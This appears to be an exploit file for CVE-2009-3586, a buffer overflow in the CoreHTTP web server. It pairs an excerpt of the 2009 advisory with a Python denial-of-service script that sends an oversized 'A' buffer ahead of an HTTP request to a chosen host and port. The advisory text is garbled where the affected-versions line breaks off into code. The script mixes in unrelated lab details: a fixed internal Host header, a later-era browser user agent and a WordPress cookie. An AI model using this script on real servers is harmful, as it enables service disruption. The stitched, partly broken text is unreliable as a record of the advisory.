# bugtraq: http://seclists.org/bugtraq/2009/Dec/99
# census ID: census-2009-0003
# URL: http://census-labs.com/news/2009/12/02/corehttp-web-server/
# CVE ID: CVE-2009-3586
# Affected Products: CoreHTTP web server versions buffer,
# 46: "%" PATHSIZE_S "[A-Za-z] %" PATHSIZE_S "s%*[ \t\n]", req, url);
# 
# The buffers req and url are declared to be of size 256 bytes (PATHSIZE)
# and the sscanf() call writes 256 bytes (PATHSIZE_S) to these buffers
# without NULL terminating them.
# 
# Note that this is not vulnerability CVE-2007-4060 in which the same
# sscanf() call contained no bounds check at all.
#
# This vulnerability can lead to denial of service attacks against the
# CoreHTTP web server and potentially to the remote execution of
# arbitrary code with the privileges of the user running the server. We
# have developed a proof-of-concept exploit to demonstrate the
# vulnerability:
#
# http://census-labs.com/media/corex.txt
#
# For the time being, one may use the following workaround to address this
# issue, until an official fix is released by the author:
#
# http://census-labs.com/media/corehttp-0.5.3.1-patch.txt
#
# -- 
#Patroklos Argyroudis
#http://www.census-labs.com/

#!/usr/bin/env python
# corex.py -- Patroklos Argyroudis, argp at domain census-labs.com
#
# Denial of service exploit for CoreHTTP web server version <= 0.5.3.1:
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3586
#
# For a detailed analysis see:
#
# http://census-labs.com/news/2009/12/02/corehttp-web-server/

import os
import sys
import socket

def main(argv):
  argc = len(argv)
  if argc != 3:
    print "usage: %s <target-ip> <target-port>" % (argv[0])
    sys.exit(0)

  try:
    host = argv[1]
    port = int(argv[2])
     
    print "[*] Sending evil buffer to: %s:%d" % (host, port)
    size = 257
    inputBuffer = "A" * size
    content = inputBuffer

    #-- Recreate the TCP headers as seen from wireshark --#
    buff  = "GET / HTTP/1.1\r\n"
    buff += "Host: 10.11.1.234:10443\r\n"
    buff += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buff += "Accept-Language: en-US,en;q=0.5\r\n"
    buff += "Accept-Encoding: gzip, deflate\r\n"
    buff += "DNT: 1\r\n"
    buff += "Connection: keep-alive\r\n"
    buff += "Cookie: wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1597488494\r\n"
    buff += "Upgrade-Insecure-Requests: 1\r\n"
    buff += "\r\n"

    # Check output of different payloads
    #payload = inputBuffer + "/index.html HTTP/1.1\r\n\r\n"
    payload = content + buff + "\r\n\r\n"
    #payload = buff + content + "\r\n\r\n"
     
    print "[*] payload: %s" % (payload)
     
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    sd.send(payload)
    sd.close()

    print "\nDone!"
  except:
    print "Could not connect!"

if __name__ == "__main__":
  main(sys.argv)
  sys.exit(0)
